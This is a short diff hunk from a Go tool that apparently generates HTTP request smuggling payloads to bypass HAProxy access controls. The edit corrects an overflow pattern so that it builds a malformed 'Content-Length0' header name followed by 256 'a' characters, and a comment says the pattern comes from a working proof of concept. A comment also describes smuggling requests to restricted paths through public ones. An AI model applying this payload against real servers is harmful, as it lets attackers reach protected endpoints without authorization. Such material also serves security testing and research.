@@ -47,7 +47,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 	// Generate overflow pattern - exact pattern from working PoC
 	// Content-Length0 + 256 'a' characters
-	overflowPattern := "q" + strings.Repeat("a", 256)
+	overflowPattern := "0" + strings.Repeat("a", 256)
 	malformedHeaderName := "Content-Length" + overflowPattern
 
 	// For each public path, try to smuggle a request to the target path
